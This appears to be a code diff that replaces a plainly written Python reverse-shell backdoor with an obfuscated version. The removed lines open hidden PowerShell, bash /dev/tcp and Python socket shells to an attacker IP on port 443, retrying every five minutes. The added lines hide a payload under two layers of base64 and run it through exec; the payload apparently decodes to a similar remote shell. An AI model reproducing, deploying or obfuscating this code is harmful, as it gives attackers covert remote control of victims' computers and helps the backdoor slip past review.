@@ -1,37 +1,7 @@
-import socket
-import os
-import sys
-import subprocess
-import time
+import base64
+e= "YVcxd2IzSjBJSE52WTJ0bGRBcHBiWEJ2Y25RZ2MzVmljSEp2WTJWemN3cHBiWEJ2Y25RZ2IzTUthVzF3YjNKMElIUnBiV1VLYVcxd2IzSjBJSE41Y3dvS1pHVm1JRzFoYVc0b0tUb0tJQ0FnSUNNZ1EyOXVibVZqZEdsdmJpQmtaWFJoYVd4ekNpQWdJQ0JoZEhSaFkydGxjbDlwY0NBOUlDSTBMblJqY0M1bGRTNXVaM0p2YXk1cGJ5SUtJQ0FnSUhCdmNuUWdQU0F4TlRVMk9Bb0tJQ0FnSUhkb2FXeGxJRlJ5ZFdVNkNpQWdJQ0FnSUNBZ2RISjVPZ29nSUNBZ0lDQWdJQ0FnSUNCeklEMGdjMjlqYTJWMExuTnZZMnRsZENoemIyTnJaWFF1UVVaZlNVNUZWQ3dnYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1FvZ0lDQWdJQ0FnSUNBZ0lDQnpMbU52Ym01bFkzUW9LR0YwZEdGamEyVnlYMmx3TENCd2IzSjBLU2tLQ2lBZ0lDQWdJQ0FnSUNBZ0lIZG9hV3hsSUZSeWRXVTZDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmpiMjF0WVc1a0lEMGdjeTV5WldOMktERXdNalFwTG1SbFkyOWtaU2hsY25KdmNuTTlJbWxuYm05eVpTSXBMbk4wY21sd0tDa0tDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQnBaaUJqYjIxdFlXNWtMbXh2ZDJWeUtDa2dQVDBnSW1WNGFYUWlPZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUhKaGFYTmxJRVY0WTJWd2RHbHZiaWdpUTI5dWJtVmpkR2x2YmlCamJHOXpaV1FnWW5rZ1lYUjBZV05yWlhJaUtRb0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHbG1JR052YlcxaGJtUXVjM1JoY25SemQybDBhQ2dpWTJRZ0lpazZDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnZEhKNU9nb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCdmN5NWphR1JwY2loamIyMXRZVzVrV3pNNlhTa0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2NtVnpjRzl1YzJVZ1BTQm1Ja05vWVc1blpXUWdaR2x5WldOMGIzSjVJSFJ2SUh0dmN5NW5aWFJqZDJRb0tYMGlDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWlhoalpYQjBJRVY0WTJWd2RHbHZiaUJoY3lCbE9nb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCeVpYTndiMjV6WlNBOUlITjBjaWhsS1FvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWld4elpUb0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J3Y205aklEMGdjM1ZpY0hKdlkyVnpjeTVRYjNCbGJpZ0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1kyOXRiV0Z1WkN3S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnYzJobGJHdzlWSEoxWlN3S0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnYzNSa2IzVjBQWE4xWW5CeWIyTmxjM011VUVsUVJTd0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2MzUmtaWEp5UFhOMVluQnliMk5sYzNNdVVFbFFSU3dLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdjM1JrYVc0OWMzVmljSEp2WTJWemN5NVFTVkJGTEFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDa0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J2ZFhSd2RYUWdQU0J3Y205akxuTjBaRzkxZEM1eVpXRmtLQ2tnS3lCd2NtOWpMbk4wWkdWeWNpNXlaV0ZrS0NrS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQnlaWE53YjI1elpTQTlJRzkxZEhCMWRDNWtaV052WkdVb1pYSnliM0p6UFNKcFoyNXZjbVVpS1FvS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUhNdWMyVnVaQ2h5WlhOd2IyNXpaUzVsYm1OdlpHVW9LU2tLQ2lBZ0lDQWdJQ0FnWlhoalpYQjBJRVY0WTJWd2RHbHZiam9LSUNBZ0lDQWdJQ0FnSUNBZ2RHbHRaUzV6YkdWbGNDZzJNQ2tnSUNNZ1VtVjBjbmtnWlhabGNua2dOakFnYzJWamIyNWtjd29nSUNBZ0lDQWdJQ0FnSUNCamIyNTBhVzUxWlFvS2FXWWdYMTl1WVcxbFgxOGdQVDBnSWw5ZmJXRnBibDlmSWpvS0lDQWdJRzFoYVc0b0tRbz0="
+d = base64.b64decode(e).decode()
+exec(base64.b64decode(d).decode())
+func = globals()[base64.b64decode("ZXhlYwo=").decode()]
 
-ATTACKER_IP = "192.168.1.77"
-PORT = 443
-
-def windows_shell():
-    while True:
-        try:
-            # Method 1: PowerShell with hidden window
-            subprocess.Popen(
-                f"powershell -nop -c $c=New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',{PORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1 | Out-String );$a=([text.encoding]::ASCII).GetBytes($o+'PS> ');$s.Write($a,0,$a.Length)}};$c.Close()",
-                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
-                shell=True
-            )
-            time.sleep(300)  # 5-minute check interval
-        except:
-            time.sleep(10)
-
-def linux_shell():
-    while True:
-        try:
-            # Multi-vector approach
-            os.system("(bash -c 'bash -i >& /dev/tcp/{0}/{1} 0>&1' &)".format(ATTACKER_IP, PORT))
-            os.system("(python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' &)".format(ATTACKER_IP, PORT))
-            time.sleep(300)
-        except:
-            time.sleep(10)
-
-if __name__ == "__main__":
-    if os.name == 'nt':
-        windows_shell()
-    else:
-        linux_shell()
+func(base64.b64decode(d).decode())
